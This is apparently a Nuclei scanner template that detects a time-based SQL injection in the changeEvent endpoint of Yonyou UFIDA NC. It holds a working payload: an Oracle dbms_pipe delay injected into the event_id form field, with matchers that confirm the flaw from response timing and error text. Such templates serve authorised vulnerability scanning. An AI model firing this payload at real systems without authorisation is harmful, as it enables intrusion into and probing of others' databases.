id: poc-yaml-yonyou-ufida-nc-changeevent-sqli

info:
  name: 用友NC changeEvent SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: POST
    path:
      - "/portal/pt/oacoSchedulerEvents/changeEvent?pageId=login"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |-
      event_id=1' AND 1=dbms_pipe.receive_message('RDS',{{t1}})--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Error"
          - "invalid UFDateTime"
          - "提示"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
